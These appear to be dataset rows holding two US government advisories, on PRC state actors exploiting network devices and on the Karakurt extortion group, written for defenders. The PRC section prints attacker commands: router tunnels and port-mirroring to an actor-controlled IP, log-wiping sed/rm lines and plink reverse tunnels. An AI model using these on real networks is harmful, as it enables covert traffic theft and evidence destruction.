http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html




 
Table 16: Information on QNAP CVE-2019-7195



                                             QNAP CVE-2019-7195                   CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
This external control of file name or path vulnerability allows remote attackers to access or modify system files. To fix the vulnerability, QNAP recommend updating Photo Station to their latest versions.




Recommended Mitigations 
Update Photo Station to versions: 

QTS 4.4.1 Photo Station 6.0.3 and later
QTS 4.3.4-QTS 4.4.0 Photo Station 5.7.10 and later
QTS 4.3.0-QTS 4.3.3 Photo Station 5.4.9 and later
QTS 4.2.6 Photo Station 5.2.11 and later




Detection Methods 

N/A





Vulnerable Technologies and Versions 
This vulnerability affects QNAP Photo Station versions 5.2.11, 5.4.9, 5.7.10, and 6.0.3 or earlier.




References 
https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html




 
Table 17: Information on Zyxel CVE-2020-29583



                                                Zyxel CVE-2020-29583            CVSS 3.0: 9.8 (Critical)





Vulnerability Description 
Firmware version 4.60 of Zyxel USG devices contains an undocumented account (zyfwp) with an unchangeable password. The password for this account can be found in cleartext in the firmware. This account can be used by someone to login to the SSH server or web interface with admin privileges.



Recommended Mitigations 

Download latest patch (4.60 Patch1 or newer)




Detection Methods 

Login attempts to the hardcoded undocumented account, seen in either audit logs or intrusion detection systems





Vulnerable Technologies and Versions 
This vulnerability affects the following technologies and versions:

ATP series running firmware ZLD V4.60
USG series running firmware ZLD V4.60
USG FLEX series running firmware ZLD V4.60
VPN series running firmware ZLD V4.60
NXC2500 running firmware V6.00 through V6.10
NXC5500 running firmware V6.00 through V6.10





References 
http://ftp.zyxel.com/USG40/firmware/USG40_4.60(AALA.1)C0_2.pdf
https://businessforum.zyxel.com/discussion/5252/zld-v4-60-revoke-and-wk48-firmware-release
https://businessforum.zyxel.com/discussion/5254/whats-new-for-zld4-60-patch-1-available-on-dec-15
https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html
https://www.zyxel.com/support/CVE-2020-29583.shtml
https://www.zyxel.com/support/security_advisories.shtml




 

Revisions

Initial Version: June 7, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1595.002', 'T1190', 'T1016.001', 'T1572', 'T20200', 'T1078', 'T1133', 'T1599', 'TA0010', 'T1020.001', 'T1555', 'T1119'}","




Summary

Best Practices
• Apply patches as soon as possible
• Disable unnecessary ports and protocols
• Replace end-of-life infrastructure
• Implement a centralized patch management system
This joint Cybersecurity Advisory describes the ways in which People’s Republic of China (PRC) state-sponsored cyber actors continue to exploit publicly known vulnerabilities in order to establish a broad network of compromised infrastructure. These actors use the network to exploit a wide variety of targets worldwide, including public and private sector organizations. The advisory details the targeting and compromise of major telecommunications companies and network service providers and the top vulnerabilities—primarily Common Vulnerabilities and Exposures (CVEs)—associated with network devices routinely exploited by the cyber actors since 2020.
This joint Cybersecurity Advisory was coauthored by the National Security Agency (NSA), the Cybersecurity and Infrastructure Security Agency (CISA), and the Federal Bureau of Investigation (FBI). It builds on previous NSA, CISA, and FBI reporting to inform federal and state, local, tribal, and territorial (SLTT) government; critical infrastructure (CI), including the Defense Industrial Base (DIB); and private sector organizations about notable trends and persistent tactics, techniques, and procedures (TTPs).
Entities can mitigate the vulnerabilities listed in this advisory by applying the available patches to their systems, replacing end-of-life infrastructure, and implementing a centralized patch management program.
NSA, CISA, and the FBI urge U.S. and allied governments, CI, and private industry organizations to apply the recommendations listed in the Mitigations section and Appendix A: Vulnerabilities to increase their defensive posture and reduce the risk of PRC state-sponsored malicious cyber actors affecting their critical networks.
For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.
Click here for PDF.
Common vulnerabilities exploited by People’s Republic of China state-sponsored cyber actors
PRC state-sponsored cyber actors readily exploit vulnerabilities to compromise unpatched network devices. Network devices, such as Small Office/Home Office (SOHO) routers and Network Attached Storage (NAS) devices, serve as additional access points to route command and control (C2) traffic and act as midpoints to conduct network intrusions on other entities. Over the last few years, a series of high-severity vulnerabilities for network devices provided cyber actors with the ability to regularly exploit and gain access to vulnerable infrastructure devices. In addition, these devices are often overlooked by cyber defenders, who struggle to maintain and keep pace with routine software patching of Internet-facing services and endpoint devices.
Since 2020, PRC state-sponsored cyber actors have conducted widespread campaigns to rapidly exploit publicly identified security vulnerabilities, also known as common vulnerabilities and exposures (CVEs). This technique has allowed the actors to gain access into victim accounts using publicly available exploit code against virtual private network (VPN) services,  or public facing applications,—without using their own distinctive or identifying malware—so long as the actors acted before victim organizations updated their systems. 
PRC state-sponsored cyber actors typically conduct their intrusions by accessing compromised servers called hop points from numerous China-based Internet Protocol (IP) addresses resolving to different Chinese Internet service providers (ISPs). The cyber actors typically obtain the use of servers by leasing remote access directly or indirectly from hosting providers. They use these servers to register and access operational email accounts, host C2 domains, and interact with victim networks. Cyber actors use these hop points as an obfuscation technique when interacting with victim networks.
These cyber actors are also consistently evolving and adapting tactics to bypass defenses. NSA, CISA, and the FBI have observed state-sponsored cyber actors monitoring network defenders’ accounts and actions, and then modifying their ongoing campaign as needed to remain undetected. Cyber actors have modified their infrastructure and toolsets immediately following the release of information related to their ongoing campaigns. PRC state-sponsored cyber actors often mix their customized toolset with publicly available tools, especially by leveraging tools that are native to the network environment, to obscure their activity by blending into the noise or normal activity of a network.
NSA, CISA, and the FBI consider the common vulnerabilities and exposures (CVEs) listed in Table 1 to be the network device CVEs most frequently exploited by PRC state-sponsored cyber actors since 2020.
 
Table 1: Top network device CVEs exploited by PRC state-sponsored cyber actors

Telecommunications and network service provider targeting
PRC state-sponsored cyber actors frequently utilize open-source tools for reconnaissance and vulnerability scanning. The actors have utilized open-source router specific software frameworks, RouterSploit and RouterScan, to identify makes, models, and known vulnerabilities for further investigation and exploitation. The RouterSploit Framework is an open-source exploitation framework dedicated to embedded devices. RouterScan is an open-source tool that easily allows for the scanning of IP addresses for vulnerabilities. These tools enable exploitation of SOHO and other routers manufactured by major industry providers, including Cisco, Fortinet, and MikroTik.
Upon gaining an initial foothold into a telecommunications organization or network service provider, PRC state-sponsored cyber actors have identified critical users and infrastructure including systems critical to maintaining the security of authentication, authorization, and accounting. After identifying a critical Remote Authentication Dial-In User Service (RADIUS) server, the cyber actors gained credentials to access the underlying Structured Query Language (SQL) database, and utilized SQL commands to dump the credentials, which contained both cleartext and hashed passwords for user and administrative accounts. 
Having gained credentials from the RADIUS server, PRC state-sponsored cyber actors used those credentials with custom automated scripts to authenticate to a router via Secure Shell (SSH), execute router commands, and save the output,. These scripts targeted Cisco and Juniper routers and saved the output of the executed commands, including the current configuration of each router. After successfully capturing the command output, these configurations were exfiltrated off network to the actor’s infrastructure,. The cyber actors likely used additional scripting to further automate the exploitation of medium to large victim networks, where routers and switches are numerous, to gather massive numbers of router configurations that would be necessary to successfully manipulate traffic within the network.
Armed with valid accounts and credentials from the compromised RADIUS server and the router configurations, the cyber actors returned to the network and used their access and knowledge to successfully authenticate and execute router commands to surreptitiously route, capture, and exfiltrate traffic out of the network to actor-controlled infrastructure. 
While other manufacturers likely have similar commands, the cyber actors executed the following commands on a Juniper router to perform initial tunnel configuration for eventual exfiltration out of the network:
set chassis fpc <slot number> pic <user defined value> tunnel-services bandwidth <user defined value>
set chassis network-services all-ethernet
set interfaces <interface-id> unit <unit number> tunnel source <local network IP address>
set interfaces <interface-id> unit <unit number> tunnel destination <actor controlled IP address>
 
After establishing the tunnel, the cyber actors configured the local interface on the device and updated the routing table to route traffic to actor-controlled infrastructure.
set interfaces <interface-id> unit <unit number> family inet address <local network IP address subnet>
set routing-options static route <local network IP address> next-hop <actor controlled IP address>
 
PRC state-sponsored cyber actors then configured port mirroring to copy all traffic to the local interface, which was subsequently forwarded through the tunnel out of the network to actor-controlled infrastructure. 
set firewall family inet filter <filter name> term <filter variable> then port-mirror
set forwarding-options port-mirroring input rate 1
set forwarding-options port-mirroring family inet output interface <interface-id> next-hop <local network IP address>
set forwarding-options port-mirroring family inet output no-filter-check
set interfaces <interface-id> unit <unit number> family inet filter input <filter name>
set interfaces <interface-id> unit <unit number> family inet filter output <filter name>
 
Having completed their configuration changes, the cyber actors often modified and/or removed local log files to destroy evidence of their activity to further obfuscate their presence and evade detection.
sed -i -e '/<REGEX>/d' <log filepath 1>
sed -i -e '/<REGEX>/d' <log filepath 2>
sed -i -e '/<REGEX>/d' <log filepath 3>
rm -f <log filepath 4>
rm -f <log filepath 5>
rm -f <log filepath 6>
 
PRC state-sponsored cyber actors also utilized command line utility programs like PuTTY Link (Plink) to establish SSH tunnels, between internal hosts and leased virtual private server (VPS) infrastructure. These actors often conducted system network configuration discovery, on these host networks by sending hypertext transfer protocol (HTTP) requests to C2 infrastructure in order to illuminate the external public IP address.
plink.exe –N –R <local port>:<host 1>:<remote port> -pw <user defined password> -batch root@<VPS1> -P <remote SSH port>
plink.exe –N –R <local port>:<host 2>:<remote port> -pw <user defined password> -batch root@<VPS2> -P <remote SSH port>
 

Mitigations

NSA, CISA, and the FBI urge organizations to apply the following recommendations as well as the mitigation and detection recommendations in Appendix A, which are tailored to observed tactics and techniques. While some vulnerabilities have specific additional mitigations below, the following mitigations generally apply:

Keep systems and products updated and patched as soon as possible after patches are released,D3-SU. Consider leveraging a centralized patch management system to automate and expedite the process.
Immediately remove or isolate suspected compromised devices from the network,D3-ITF,D3-OTF,.
Segment networks to limit or block lateral movement,D3-NI,. 
Disable unused or unnecessary network services, ports, protocols, and devices,D3-ACH,D3-ITF,D3-OTF,. 
Enforce multifactor authentication (MFA) for all users, without exception,D3-MFA,. 
Enforce MFA on all VPN connections,D3-MFA,. If MFA is unavailable, enforce password complexity requirements,D3-SPP,. 
Implement strict password requirements, enforcing password complexity, changing passwords at a defined frequency, and performing regular account reviews to ensure compliance,D3-SPP,.
Perform regular data backup procedures and maintain up-to-date incident response and recovery procedures. 
Disable external management capabilities and set up an out-of-band management network,D3-NI,.
Isolate Internet-facing services in a network Demilitarized Zone (DMZ) to reduce the exposure of the internal network,D3-NI,.
Enable robust logging of Internet-facing services and monitor the logs for signs of compromise,D3-NTA,D3-PM,.
Ensure that you have dedicated management systems,D3-PH, and accounts for system administrators. Protect these accounts with strict network policies,D3-UAP,.
Enable robust logging and review of network infrastructure accesses, configuration changes, and critical infrastructure services performing authentication, authorization, and accounting functions,D3-PM,. 
Upon responding to a confirmed incident within any portion of a network, response teams should scrutinize network infrastructure accesses, evaluate potential lateral movement to network infrastructure and implement corrective actions commensurate with their findings.

Resources
Refer to us-cert.cisa.gov/china, https://www.ic3.gov/Home/IndustryAlerts, and https://www.nsa.gov/cybersecurity-guidance for previous reporting on People’s Republic of China state-sponsored malicious cyber activity.
U.S. government and critical infrastructure organizations, should consider signing up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats.
U.S. Defense Industrial Base (DIB) organizations, should consider signing up for the NSA Cybersecurity Collaboration Center’s DIB Cybersecurity Service Offerings, including Protective Domain Name System (PDNS) services, vulnerability scanning, and threat intelligence collaboration. For more information on eligibility criteria and how to enroll in these services, email dib_defense@cyber.nsa.gov.
Additional References

CISA (2022), Weak Security Controls and Practices Routinely Exploited for Initial Access. https://www.cisa.gov/uscert/ncas/alerts/aa22-137a
CISA (2022) 2021 Top Routinely Exploited Vulnerabilities. https://www.cisa.gov/uscert/ncas/alerts/aa22-117a
NSA (2021), Selecting and Hardening Remote Access VPN Solutions. https://media.defense.gov/2021/Sep/28/2002863184/-1/-1/0/CSI_SELECTING-HARDENING-REMOTE-ACCESS-VPNS-20210928.PDF 
NSA (2021), Chinese State-Sponsored Cyber Operations: Observed TTPs. https://media.defense.gov/2021/Jul/19/2002805003/-1/-1/0/CSA_CHINESE_STATE-SPONSORED_CYBER_TTPS.PDF 
CISA (2021), Exploitation of Pulse Connect Secure Vulnerabilities. https://www.cisa.gov/uscert/ncas/alerts/aa21-110a
NSA (2020), Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities. https://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF 
CISA (2020), Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity. https://www.cisa.gov/uscert/ncas/alerts/aa20-258a 
NSA (2020), Performing Out-of-Band Network Management. https://media.defense.gov/2020/Sep/17/2002499616/-1/-1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF 
CISA (2020), Critical Vulnerability in Citrix Application Delivery Controller, Gateway, and SD-WAN WANOP. https://www.cisa.gov/uscert/ncas/alerts/aa20-020a
NSA (2019), Mitigating Recent VPN Vulnerabilities. https://media.defense.gov/2019/Oct/07/2002191601/-1/-1/0/Mitigating%20Recent%20VPN%20Vulnerabilities%20-%20Copy.pdf 
NSA (2019), Update and Upgrade Software Immediately. https://media.defense.gov/2019/Sep/09/2002180319/-1/-1/0/Update%20and%20Upgrade%20Software%20Immediately.docx%20-%20Copy.pdf 

Contact Information 
To report incidents and anomalous activity or to request incident response resources or technical assistance related to these threats, contact CISA at report@cisa.gov. To report computer intrusion or cybercrime activity related to information found in this advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch at 855-292-3937 or by email at CyWatch@fbi.gov. For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov. 
Media Inquiries / Press Desk: 

NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov  
CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov 
FBI National Press Office, 202-324-3691, npo@fbi.gov 

Disclaimer of endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This advisory was developed by NSA, CISA, and the FBI in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders. 
Appendix A: Vulnerabilities
Table 2: Information on Cisco CVE-2018-0171

 
Table 3: Information on Cisco CVE-2019-15271

 
Table 4: Information on Cisco CVE-2019-1652

 
Table 5: Information on Citrix CVE-2019-19781

 
Table 6: Information on DrayTek CVE-2020-8515

 
Table 7: Information on D-Link CVE-2019-16920

 
Table 8: Information on Fortinet CVE-2018-13382

 
Table 9: Information on Mikrotik CVE-2018-14847

 
Table 10: Information on Netgear CVE-2017-6862

 
Table 11: Information on Pulse CVE-2019-11510

 
Table 12: Information on Pulse CVE-2021-22893

 
Table 13: Information on QNAP CVE-2019-7192

 
Table 14: Information on QNAP CVE- 2019-7193

 
Table 15: Information on QNAP CVE-2019-7194

 
Table 16: Information on QNAP CVE-2019-7195

 
Table 17: Information on Zyxel CVE-2020-29583

 

Revisions

Initial Version: June 7, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-158a
47,"






Actions to take today to mitigate cyber threats from Karakurt ransomware:




Prioritize patching known exploited vulnerabilities.
Train users to recognize and report phishing attempts.
Enforce multifactor authentication.







SUMMARY
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Department of the Treasury (Treasury), and the Financial Crimes Enforcement Network (FinCEN) are releasing this joint Cybersecurity Advisory (CSA) to provide information on the Karakurt data extortion group, also known as the Karakurt Team and Karakurt Lair. Karakurt actors have employed a variety of tactics, techniques, and procedures (TTPs), creating significant challenges for defense and mitigation. Karakurt victims have not reported encryption of compromised machines or files; rather, Karakurt actors have claimed to steal data and threatened to auction it off or release it to the public unless they receive payment of the demanded ransom. Known ransom demands have ranged from $25,000 to $13,000,000 in Bitcoin, with payment deadlines typically set to expire within a week of first contact with the victim.
Karakurt actors have typically provided screenshots or copies of stolen file directories as proof of stolen data. Karakurt actors have contacted victims’ employees, business partners, and clients [T1591.002] with harassing emails and phone calls to pressure the victims to cooperate. The emails have contained examples of stolen data, such as social security numbers, payment accounts, private company emails, and sensitive business data belonging to employees or clients. Upon payment of ransoms, Karakurt actors have provided some form of proof of deletion of files and, occasionally, a brief statement explaining how the initial intrusion occurred.
Prior to January 5, 2022, Karakurt operated a leaks and auction website found at https://karakurt[.]group. The domain and IP address originally hosting the website went offline in the spring 2022. The website is no longer accessible on the open internet, but has been reported to be located elsewhere in the deep web and on the dark web. As of May 2022, the website contained several terabytes of data purported to belong to victims across North America and Europe, along with several “press releases” naming victims who had not paid or cooperated, and instructions for participating in victim data “auctions.”
Download the PDF version of this report:


AA22-152A Karakurt Data Extortion Group
(PDF,       508.81 KB
  )


Click here for STIX. 
TECHNICAL DETAILS
Initial Intrusion
Karakurt does not appear to target any specific sectors, industries, or types of victims. During reconnaissance [TA0043], Karakurt actors appear to obtain access to victim devices primarily:

By purchasing stolen login credentials [T1589.001],[T1589.002];
Via cooperating partners in the cybercrime community, who provide Karakurt access to already compromised victims; or
Through buying access to already compromised victims via third-party intrusion broker networks [T1589.001].

Note: Intrusion brokers, or intrusion broker networks, are malicious individual cyber actors or groups of actors who use a variety of tools and skills to obtain initial access to—and often create marketable persistence within—protected computer systems. Intrusion brokers then sell access to these compromised computer systems to other cybercriminal actors, such as those engaged in ransomware, business email compromise, corporate and government espionage, etc.



Some Karakurt victims have reported that initial intrusion may have occurred via compromised Cisco AnyConnect VPN user accounts. Many of these victims reported multi-factor authentication was not enforced for their Cisco AnyConnect VPN platforms.
Common intrusion vulnerabilities exploited for initial access [TA001] in Karakurt events include the following:

Outdated SonicWall SSL VPN appliances [T1133] are vulnerable to multiple recent CVEs,
Log4j “Log4Shell” Apache Logging Services vulnerability (CVE-2021-44228) [T1190],
Phishing and spearphishing [T1566],
Malicious macros within email attachments [T1566.001],
Stolen virtual private network (VPN) or Remote Desktop Protocol (RDP) credentials [T1078],
Outdated Fortinet FortiGate SSL VPN appliances [T1133]/firewall appliances [T1190] are vulnerable to multiple recent CVEs,
Outdated and/or unserviceable Microsoft Windows Server instances,
Outdated and/or unpatched Cisco AnyConnect software and hardware appliances.

Network Reconnaissance, Enumeration, Persistence, and Exfiltration
Upon developing or obtaining access to a compromised system, Karakurt actors deploy Cobalt Strike beacons to enumerate a network [T1083], install Mimikatz to pull plain-text credentials [T1078], use AnyDesk to obtain persistent remote control [T1219], and utilize additional situation-dependent tools to elevate privileges and move laterally within a network.
Karakurt actors then compress (typically with 7zip) and exfiltrate large sums of data—and, in many cases, entire network-connected shared drives in volumes exceeding 1 terabyte (TB)—using open source applications and File Transfer Protocol (FTP) services [T1048] such as Filezilla and cloud storage services including rclone and Mega.nz [T1567.002].
Extortion
Following the exfiltration of data, Karakurt actors present the victim with ransom notes by way of “readme.txt” files, via emails sent to victim employees over the compromised email networks, and emails sent to victim employees from external email accounts. The ransom notes reveal the victim has been hacked by the “Karakurt Team” and threaten public release or auction of the stolen data. The instructions include a link to a TOR URL with an access code. Visiting the URL and inputting the access code open a chat application over which victims can negotiate with Karakurt actors to have their data deleted.
Karakurt victims have reported extensive harassment campaigns by Karakurt actors in which employees, business partners, and clients receive numerous emails and phone calls warning the recipients to encourage the victims to negotiate with the actors to prevent the dissemination of victim data. These communications often included samples of stolen data—primarily personally identifiable information (PII), such as employment records, health records, and financial business records.
Victims who negotiate with Karakurt actors receive “proof of life,” such as screenshots showing file trees of allegedly stolen data or, in some cases, actual copies of stolen files. Upon reaching an agreement on the price of the stolen data with the victims, Karakurt actors provided a Bitcoin address—usually a new, previously unused address—to which ransom payments could be made.
Upon receiving the ransom, Karakurt actors provide some form of alleged proof of deletion of the stolen files, such as a screen recording of the files being deleted, a deletion log, or credentials for a victim to log into a storage server and delete the files themselves.
Although Karakurt’s primary extortion leverage is a promise to delete stolen data and keep the incident confidential, some victims reported Karakurt actors did not maintain the confidentiality of victim information after a ransom was paid. Note: The U.S. government strongly discourage the payment of any ransom to Karakurt threat actors, or any cyber criminals promising to delete stolen files in exchange for payments.
In some cases, Karakurt actors have conducted extortion against victims previously attacked by other ransomware variants. In such cases, Karakurt actors likely purchased or otherwise obtained previously stolen data. Karakurt actors have also targeted victims at the same time these victims were under attack by other ransomware actors. In such cases, victims received ransom notes from multiple ransomware variants simultaneously, suggesting Karakurt actors purchased access to a compromised system that was also sold to another ransomware actor.
Karakurt actors have also exaggerated the degree to which a victim had been compromised and the value of data stolen. For example, in some instances, Karakurt actors claimed to steal volumes of data far beyond the storage capacity of compromised systems or claimed to steal data that did not belong to the victim.
Indicators of Compromise




Email






mark.hubert1986@gmail.com; karakurtlair@gmail.com; personal.information.reveal@gmail.com; ripidelfun1986@protonmail.com; gapreappballye1979@protonmail.com; confedicial.datas.download@protonmail.com; armada.mitchell94@protonmail.com




Protonmail email accounts in the following formats: victimname_treasure@protonmail.com, victimname_jewels@protonmail.com, victimname_files@protonmail.com








Tools

 





Onion site


https://omx5iqrdbsoitf3q4xexrqw5r5tfw7vp3vl3li3lfo7saabxazshnead.onion




Tools


Rclone.exe;; AnyDesk.exe; Mimikatz




Ngrok


SSH tunnel application SHA256 - 3e625e20d7f00b6d5121bb0a71cfa61f92d658bcd61af2cf5397e0ae28f4ba56




DLLs
masquerading as legitimate Microsoft binaries to System32


Mscxxx.dll: SHA1 - c33129a680e907e5f49bcbab4227c0b02e191770 Msuxxx.dll: SHA1 - 030394b7a2642fe962a7705dcc832d2c08d006f5




Msxsl.exe


Legitimate Microsoft Command Line XSL Transformation Utility SHA1 - 8B516E7BE14172E49085C4234C9A53C6EB490A45




dllhosts.exe


Rclone SHA1 - fdb92fac37232790839163a3cae5f37372db7235




rclone.conf


Rclone configuration file




filter.txt


Rclone file extension filter file




c.bat


UNKNOWN




3.bat


UNKNOWN




Potential malicious document


SHA1 - 0E50B289C99A35F4AD884B6A3FFB76DE4B6EBC14




Tools

 



Potential malicious document


SHA1 - 7E654C02E75EC78E8307DBDF95E15529AAAB5DFF




Malicious text
file


SHA1 - 4D7F4BB3A23EAB33A3A28473292D44C5965DDC95




Malicious text
file


SHA1 - 10326C2B20D278080AA0CA563FC3E454A85BB32F 








Cobalt Strike Hashes






SHA256 - 563BC09180FD4BB601380659E922C3F7198306E0CAEBE99CD1D88CD2C3FD5C1B




SHA256 - 5E2B2EBF3D57EE58CADA875B8FBCE536EDCBBF59ACC439081635C88789C67ACA




SHA256 - 712733C12EA3B6B7A1BCC032CC02FD7EC9160F5129D9034BF9248B27EC057BD2




SHA256 - 563BC09180FD4BB601380659E922C3F7198306E0CAEBE99CD1D88CD2C3FD5C1B




SHA256 - 5E2B2EBF3D57EE58CADA875B8FBCE536EDCBBF59ACC439081635C88789C67ACA




SHA256 - 712733C12EA3B6B7A1BCC032CC02FD7EC9160F5129D9034BF9248B27EC057BD2




SHA1 - 86366bb7646dcd1a02700ed4be4272cbff5887af








Ransom note text sample:

 





1.


Here's the deal
We breached your internal network and took control over all of your systems.




2.


We analyzed and located each piece of more-or-less important files while spending weeks inside.




3.


We exfiltrated anything we wanted (xxx GB (including Private & Confidential information, Intellectual Property, Customer Information and most important Your TRADE SECRETS)




Ransom note text sample:


 




FAQ:


Who the hell are you?
The Karakurt Team. Pretty skilled hackers I guess.








Payment Wallets:






bc1qfp3ym02dx7m94td4rdaxy08cwyhdamefwqk9hp




bc1qw77uss7stz7y7kkzz7qz9gt7xk7tfet8k30xax




bc1q8ff3lrudpdkuvm3ehq6e27nczm393q9f4ydlgt




bc1qenjstexazw07gugftfz76gh9r4zkhhvc9eeh47




bc1qxfqe0l04cy4qgjx55j4qkkm937yh8sutwhlp4c




bc1qw77uss7stz7y7kkzz7qz9gt7xk7tfet8k30xax




bc1qrtq27tn34pvxaxje4j33g3qzgte0hkwshtq7sq




bc1q25km8usscsra6w2falmtt7wxyga8tnwd5s870g




bc1qta70dm5clfcxp4deqycxjf8l3h4uymzg7g6hn5




bc1qrkcjtdjccpy8t4hcna0v9asyktwyg2fgdmc9al




bc1q3xgr4z53cdaeyn03luhen24xu556y5spvyspt8




bc1q6s0k4l8q9wf3p9wrywf92czrxaf9uvscyqp0fu




bc1qj7aksdmgrnvf4hwjcm5336wg8pcmpegvhzfmhw




bc1qq427hlxpl7agmvffteflrnasxpu7wznjsu02nc




bc1qz9a0nyrqstqdlr64qu8jat03jx5smxfultwpm0




bc1qq9ryhutrprmehapvksmefcr97z2sk3kdycpqtr




bc1qa5v6amyey48dely2zq0g5c6se2keffvnjqm8ms




bc1qx9eu6k3yhtve9n6jtnagza8l2509y7uudwe9f6




bc1qtm6gs5p4nr0y5vugc93wr0vqf2a0q3sjyxw03w




bc1qta70dm5clfcxp4deqycxjf8l3h4uymzg7g6hn5




bc1qx9eu6k3yhtve9n6jtnagza8l2509y7uudwe9f6




bc1qqp73up3xff6jz267n7vm22kd4p952y0mhcd9c8




bc1q3xgr4z53cdaeyn03luhen24xu556y5spvyspt8




MITRE ATT&CK TACTICS AND TECHNIQUES
See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.

Table 1: Karakurt Actors ATT&CK Techniques for Enterprise



Reconnaissance

 
 





Technique Title


ID


Use




Gather Victim Identify Information: Credentials


T1589.001


Karakurt actors have purchased stolen login credentials.




Gather Victim Identity Information: Email Addresses


T1589.002


Karakurt actors have purchased stolen login credentials including email addresses.




Gather Victim Org Information: Business Relationships


T1591.002


Karakurt actors have leveraged victims' relationships with business partners.




Initial Access

 
 



Technique Title


ID


Use




Exploit Public-Facing Applications


T1190


Karakurt actors have exploited the Log4j ""Log4Shell"" Apache Logging Service vulnerability and vulnerabilities in outdated firewall appliances for gaining access to victims' networks.




External Remote Services


T1133


Karakurt actors have exploited vulnerabilities in outdated VPN appliances for gaining access to victims' networks.




Phishing


T1566


Karakurt actors have used phishing and spearphishing to obtain access to victims' networks.




Phishing – Spearphishing Attachment


T1566.001


Karakurt actors have sent malicious macros as email attachments to gain initial access.




Valid Accounts


T1078


Karakurt actors have purchased stolen credentials, including VPN and RDP credentials, to gain access to victims' networks.




Privilege Escalation

 
 



Technique Title


ID


Use




Valid Accounts


T1078


Karakurt actors have installed Mimikatz to pull plain-text credentials.




Discovery

 
 



Technique Title


ID


Use




File and Directory Discovery


T1083


Karakurt actors have deployed Cobalt Strike beacons to enumerate a network.




Command and Control

 
 



Technique Title


ID


Use




Remote Access Software


T1219


Karakurt actors have used AnyDesk to obtain persistent remote control of victims' systems.




Exfiltration

 
 



Technique Title


ID


Use




Exfiltration Over Alternative Protocol


T1048


Karakurt actors have used FTP services, including Filezilla, to exfiltrate data from victims' networks.




Exfiltration Over Web Service: Exfiltration to Cloud Storage


T1567.002


Karakurt actors have used rclone and Mega.nz to exfiltrate data stolen from victims' networks.




MITIGATIONS

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Implement network segmentation and maintain offline backups of data to ensure limited interruption to the organization.
Regularly back up data and password protect backup copies offline. Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides.
Install and regularly update antivirus software on all hosts and enable real time detection.
Install updates/patch operating systems, software, and firmware as soon as updates/patches are released.
Review domain controllers, servers, workstations, and active directories for new or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls with least privilege in mind. Do not give all users administrative privileges.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Enforce multi-factor authentication.
Use the National Institute for Standards and Technology’s (NIST’s) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;

Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.




Only use secure networks and avoid using public Wi-Fi networks. Consider installing and using a VPN.
Focus on cyber security awareness and training. Regularly provide users with training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities (i.e., ransomware and phishing scams).

RESOURCES

For additional resources related to the prevention and mitigation of ransomware, visit Stopransomware.gov as well as the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide and NIST’s Data Integrity: Detecting and Responding to Ransomware and Other Destructive Events. Stopransomware.gov is the U.S. government’s one-stop location for resources to tackle ransomware more effectively.
CISA’s Ransomware Readiness Assessment is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware.
Financial Institutions must also ensure compliance with any applicable Bank Secrecy Act requirements, including suspicious activity reporting obligations. Indicators of Compromise, such as suspicious email addresses, file names, hashes, domains, and IP addresses, can be provided under Item 44 of the Suspicious Activity Report (SAR) form. For more information on mandatory and voluntary reporting of cyber events via suspicious activity reports (SARs), see FinCEN Advisory FIN-2016-A005, Advisory to Financial Institutions on Cyber-Events and Cyber-Enabled Crime, October 25, 2016, and FinCEN Advisory FIN-2021-A004, Advisory on Ransomware and the Use of the Financial System to Facilitate Ransom Payments, November 8, 2021, which updates FinCEN Advisory FIN-2020-A006.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.

VERSION HISTORY
June 01, 2022: Initial version.
June 02, 2022: Added STIX file.
